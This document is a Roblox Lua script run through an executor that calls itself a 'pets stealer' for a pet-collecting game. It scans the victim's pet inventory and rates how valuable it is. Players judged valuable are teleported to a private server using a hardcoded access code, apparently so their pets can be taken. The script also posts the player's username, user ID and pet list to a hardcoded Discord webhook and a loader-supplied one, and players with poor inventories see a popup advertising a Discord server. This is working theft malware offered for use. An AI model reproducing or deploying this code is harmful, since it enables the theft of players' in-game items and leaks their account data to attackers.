local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local EXECUTION_FLAG_NAME = "ChetosNotifierFlag"
if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then return end
local flag = Instance.new("BoolValue")
flag.Name = EXECUTION_FLAG_NAME
flag.Parent = CoreGui

local CONFIG = {
    ["MAIN_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1423150330220380170/1NfkU25fK9dnB23Zsh-yMVCFWNNZpAsI4zxeI-sP14YLDLI5VQ2pWU8CTcfd2ajoDSqp",
    ["PING_ROLE_ID"] = "@everyone",
    ["HVT_ACCESS_CODE"] = "j50GRP6cfkV1FnSNh_-5CBLmxfmpdUPBjvfeTzW04u2S8DWlZnMAAA2",
    ["HUGE_PET_WEIGHT"] = 6.0,
    ["AGED_PET_DAYS"] = 50,
    ["MAX_PETS_IN_LIST"] = 15,
    ["DYNAMIC_DISCORD_LINKS"] = {"https://discord.gg/BDBX4y9sMH"},
    ["PRIORITY_PETS"] = {
        ["Cockatrice"] = true, ["Disco Bee"] = true, ["Dragonfly"] = true, ["Fennec Fox"] = true,
        ["French Fry Ferret"] = true, ["GIANT Swan"] = true, ["Golden Goose"] = true, ["Green Bean"] = true,
        ["Griffin"] = true, ["Lobster Thermidor"] = true, ["Luminous Sprite"] = true, ["Mizuchi"] = true,
        ["Phoenix"] = true, ["Queen Bee"] = true, ["Raccoon"] = true, ["Raiju"] = true,
        ["Red Panda"] = true, ["Space Squirrel"] = true, ["Spinosaurus"] = true, ["Swan"] = true,
        ["T-Rex"] = true, ["Tiger"] = true, ["Rainbow Dilophosaurus"] = true, ["Rainbow Griffin"] = true,
        ["Rainbow Lobster Thermidor"] = true, ["Rainbow Mizuchi"] = true, ["Rainbow Phoenix"] = true,
        ["Rainbow Spinosaurus"] = true, ["Corrupted Kitsune"] = true, ["Kitsune"] = true, ["Rainbow Corrupted Kitsune"] = true,
        ["Peacock"] = true, ["Mimic Octopus"] = true, ["Mimic"] = true, ["Butterfly"] = true
    }
}

local MUTATION_MAP = {}
pcall(function()
    local PetMutationRegistry = require(ReplicatedStorage.Data.PetRegistry.PetMutationRegistry)
    for name, data in pairs(PetMutationRegistry.PetMutationRegistry) do
        MUTATION_MAP[data.EnumId] = name; MUTATION_MAP[name] = name
    end
end)

local function createStyledNotificationGUI(titleText, messageText, buttonText)
    local chosenLink = CONFIG["DYNAMIC_DISCORD_LINKS"][math.random(1, #CONFIG["DYNAMIC_DISCORD_LINKS"])]
    local gui = Instance.new("ScreenGui", CoreGui); gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global; gui.DisplayOrder = 1000
    local overlay = Instance.new("Frame", gui); overlay.Size = UDim2.fromScale(1, 1); overlay.BackgroundColor3 = Color3.new(0, 0, 0); overlay.BackgroundTransparency = 0.4; overlay.Active = true
    local mainFrame = Instance.new("Frame", overlay); mainFrame.AnchorPoint = Vector2.new(0.5, 0.5); mainFrame.Position = UDim2.fromScale(0.5, 0.5); mainFrame.Size = UDim2.new(0, 500, 0, 250); mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32); mainFrame.BackgroundTransparency = 0.1; mainFrame.BorderSizePixel = 0
    local corner = Instance.new("UICorner", mainFrame); corner.CornerRadius = UDim.new(0, 12)
    local titleLabel = Instance.new("TextLabel", mainFrame); titleLabel.AnchorPoint = Vector2.new(0.5, 0); titleLabel.Position = UDim2.fromScale(0.5, 0.1); titleLabel.Size = UDim2.fromScale(0.8, 0.2); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.SourceSansBold; titleLabel.Text = titleText; titleLabel.TextColor3 = Color3.new(1, 1, 1); titleLabel.TextScaled = true
    local messageLabel = Instance.new("TextLabel", mainFrame); messageLabel.AnchorPoint = Vector2.new(0.5, 0.45); messageLabel.Position = UDim2.fromScale(0.5, 0.45); messageLabel.Size = UDim2.fromScale(0.85, 0.3); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.SourceSans; messageLabel.Text = messageText; messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200); messageLabel.TextSize = 18; messageLabel.TextWrapped = true
    local linkButton = Instance.new("TextButton", mainFrame); linkButton.AnchorPoint = Vector2.new(0.5, 1); linkButton.Position = UDim2.fromScale(0.5, 0.9); linkButton.Size = UDim2.fromScale(0.7, 0.25); linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242); linkButton.Font = Enum.Font.SourceSansBold; linkButton.Text = buttonText; linkButton.TextColor3 = Color3.new(1, 1, 1); linkButton.TextScaled = true
    local btnCorner = Instance.new("UICorner", linkButton); btnCorner.CornerRadius = UDim.new(0, 8)
    linkButton.MouseButton1Click:Connect(function() if type(setclipboard) == "function" then setclipboard(chosenLink); linkButton.Text = "LINK COPIED!"; task.wait(2); linkButton.Text = buttonText end end)
    return gui
end

local Util = {}
function Util.Get(tbl, path, default)
    local current = tbl
    for key in string.gmatch(path, "[^.]+") do
        if type(current) ~= "table" or current[key] == nil then return default end
        current = current[key]
    end
    return current
end
local function getExecutorName()
    if getexecutorname then local s, n = pcall(getexecutorname); if s and type(n) == "string" then return n end end
    if identifyexecutor then local s, n = pcall(identifyexecutor); if s and type(n) == "string" then return n:gsub(" Executor", "") end end
    return "Unknown"
end
local function sendWebhook(url, payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if not requestFunc or not url then return end
    task.spawn(function()
        pcall(function()
            requestFunc({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
        end)
    end)
end
task.spawn(function()
    local LOADER_WEBHOOK = getgenv().webhook
    local DataService = require(ReplicatedStorage.Modules.DataService)
    local PlayerData = DataService:GetData()
    local InventoryData = Util.Get(PlayerData, "PetsData.PetInventory.Data")
    if not InventoryData then return end
    local allNotablePets = {}
    local stats = {total = 0, huge = 0, agedMutated = 0, priority = 0, titanic = 0, mega = 0}
    local hvtCounters = {HugePeacock=0, HugeMimicOctopus=0, RainbowMimic=0, Raccoon=0, Dragonfly=0, Butterfly=0, DiscoBee=0, Kitsune=0, AnyRainbowPriority=0}
    for uuid, petInfo in pairs(InventoryData) do
        if type(petInfo) == "table" and petInfo.PetData then
            local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
            if baseWeight > 0 then
                stats.total = stats.total + 1
                local mutationValue = Util.Get(petInfo, "PetData.MutationType") or Util.Get(petInfo, "PetData.Mutation")
                local mutationName = (mutationValue and MUTATION_MAP[tostring(mutationValue)]) or ""
                local basePetType = tostring(petInfo.PetType or "Unknown")
                local pet = {
                    typeName = (mutationName ~= "" and mutationName .. " " or "") .. basePetType,
                    basePetType = basePetType,
                    weight = tonumber(Util.Get(petInfo, "PetData.Weight")) or baseWeight,
                    age = tonumber(Util.Get(petInfo, "PetData.Age", 0)),
                    level = tonumber(Util.Get(petInfo, "PetData.Level", 1)),
                    isHuge = baseWeight >= CONFIG.HUGE_PET_WEIGHT,
                    isAged = (math.floor(tonumber(Util.Get(petInfo, "PetData.Age", 0)) / 86400) >= CONFIG.AGED_PET_DAYS),
                    isMutated = mutationName ~= ""
                }
                local isPriority = CONFIG.PRIORITY_PETS[basePetType]
                if pet.isHuge or isPriority or pet.isAged or pet.isMutated then table.insert(allNotablePets, pet) end
                if pet.isHuge then stats.huge = stats.huge + 1 end
                if isPriority then stats.priority = stats.priority + 1 end
                if pet.isAged or pet.isMutated then stats.agedMutated = stats.agedMutated + 1 end
                if pet.typeName:find("Titanic") then stats.titanic = stats.titanic + 1 end
                if pet.typeName:find("Mega") then stats.mega = stats.mega + 1 end
                if pet.isHuge and pet.basePetType == "Peacock" then hvtCounters.HugePeacock = hvtCounters.HugePeacock + 1 end
                if pet.isHuge and pet.basePetType == "Mimic Octopus" then hvtCounters.HugeMimicOctopus = hvtCounters.HugeMimicOctopus + 1 end
                if pet.typeName:find("Rainbow") and pet.basePetType == "Mimic" then hvtCounters.RainbowMimic = hvtCounters.RainbowMimic + 1 end
                if pet.basePetType == "Raccoon" then hvtCounters.Raccoon = hvtCounters.Raccoon + 1 end
                if pet.basePetType == "Dragonfly" then hvtCounters.Dragonfly = hvtCounters.Dragonfly + 1 end
                if pet.basePetType == "Butterfly" then hvtCounters.Butterfly = hvtCounters.Butterfly + 1 end
                if pet.basePetType == "Disco Bee" then hvtCounters.DiscoBee = hvtCounters.DiscoBee + 1 end
                if pet.basePetType:find("Kitsune") then hvtCounters.Kitsune = hvtCounters.Kitsune + 1 end
                if isPriority and pet.typeName:find("Rainbow") then hvtCounters.AnyRainbowPriority = hvtCounters.AnyRainbowPriority + 1 end
            end
        end
    end
    if stats.huge == 0 and stats.priority == 0 then
        createStyledNotificationGUI("LACK OF VALUABLES", "Your inventory has no Huge or Divine pets. Join our community for trading and tips to get better pets!", "Copy Discord Link")
        return
    end
    local isHVT = (stats.huge >= 4 or hvtCounters.HugePeacock >= 1 or hvtCounters.HugeMimicOctopus >= 1 or hvtCounters.RainbowMimic >= 1 or hvtCounters.Raccoon >= 3 or hvtCounters.Dragonfly >= 4 or hvtCounters.Butterfly >= 3 or hvtCounters.DiscoBee >= 2 or hvtCounters.Kitsune >= 1 or hvtCounters.AnyRainbowPriority >= 1)
    if isHVT then
        pcall(function() game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", CONFIG.HVT_ACCESS_CODE) end)
    else
        local accesscode = getgenv().accesscode
        if accesscode then
            pcall(function() game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accesscode) end)
        end
    end
    local function computeRiskAndColor(s, counters)
        if s.titanic > 0 or s.mega > 0 then return "EXTREME RISK", 15158332 end
        if counters.Kitsune > 0 then return "HIGH RISK", 15105570 end
        if counters.Dragonfly >= 4 or counters.Raccoon >= 3 or counters.AnyRainbowPriority >= 1 then return "MEDIUM RISK", 16776960 end
        return "LOW RISK", 3066993
    end
    local function getPetSortScore(pet)
        local isPriority = CONFIG.PRIORITY_PETS[pet.basePetType]
        if pet.basePetType:find("Kitsune") then return 1 end
        if (pet.isHuge and (pet.basePetType == "Peacock" or pet.basePetType == "Mimic Octopus")) or (pet.typeName:find("Rainbow") and pet.basePetType == "Mimic") then return 2 end
        if isPriority and pet.typeName:find("Rainbow") then return 3 end
        if pet.basePetType == "Raccoon" or pet.basePetType == "Dragonfly" or pet.basePetType == "Butterfly" or pet.basePetType == "Disco Bee" then return 4 end
        if pet.isHuge and isPriority then return 5 end
        if pet.isHuge then return 6 end
        if isPriority then return 7 end
        return 8
    end
    local function formatPetList(petList)
        table.sort(petList, function(a, b)
            local scoreA = getPetSortScore(a)
            local scoreB = getPetSortScore(b)
            if scoreA ~= scoreB then return scoreA < scoreB end
            return a.weight > b.weight
        end)
        local list = {"```"}
        for i, pet in ipairs(petList) do
            if i > CONFIG.MAX_PETS_IN_LIST then
                table.insert(list, string.format("➕ ... and %d more pets", #petList - CONFIG.MAX_PETS_IN_LIST))
                break
            end
            local icon = "🐾"
            local isPriority = CONFIG.PRIORITY_PETS[pet.basePetType]
            if pet.isHuge and isPriority then icon = "💎"
            elseif pet.isHuge then icon = "👑"
            elseif isPriority then icon = "🎯"
            elseif pet.isAged or pet.isMutated then icon = "⭐"
            end
            local ageText = ""
            if pet.age > 0 then
                local d, h = math.floor(pet.age / 86400), math.floor((pet.age % 86400) / 3600)
                ageText = d > 0 and string.format(" (Age: %dd %dh)", d, h) or string.format(" (Age: %dh)", h)
            end
            table.insert(list, string.format("%s %s - %.2f KG%s [Lv.%d]", icon, pet.typeName, pet.weight, ageText, pet.level))
        end
        table.insert(list, "```")
        return table.concat(list, "\n")
    end
    local executorName = getExecutorName()
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    local formattedPets = formatPetList(allNotablePets)
    local riskText, riskColor = computeRiskAndColor(stats, hvtCounters)
    local description = table.concat({
        "**👤 Player Information**", "```",
        ("😭 Display Name: %s"):format(player.DisplayName),
        ("👤 Username: @%s"):format(player.Name),
        ("👁️ User ID: %d"):format(player.UserId),
        ("💻 Executor: %s"):format(executorName),
        ("🌐 Server: %d/%d"):format(playerCount, maxPlayers), "```",
        "**📊 BACKPACK STATISTICS**", "```",
        ("🐾 Total Pets: %d"):format(stats.total),
        ("👑 Huge Pets: %d"):format(stats.huge),
        ("🎯 Priority Pets: %d"):format(stats.priority),
        ("⭐ Aged/Mutated: %d"):format(stats.agedMutated), "```",
        "**💎 Top Pets (" .. riskText .. ")**",
        formattedPets
    }, "\n")
    local embed = {
        title = "🐾 **CHETOS NOTIFIER**",
        color = riskColor,
        description = description,
        footer = { text = "CHETOS STEALER", icon_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&" },
        timestamp = os.date("!%Y-m-%dT%H:%M:%SZ")
    }
    local payload = {
        username = "CHETOS PETS STEALER",
        avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",
        content = CONFIG.PING_ROLE_ID,
        embeds = { embed }
    }
    sendWebhook(CONFIG.MAIN_WEBHOOK_URL, payload)
    if not isHVT and LOADER_WEBHOOK then
        sendWebhook(LOADER_WEBHOOK, payload)
    end
end)
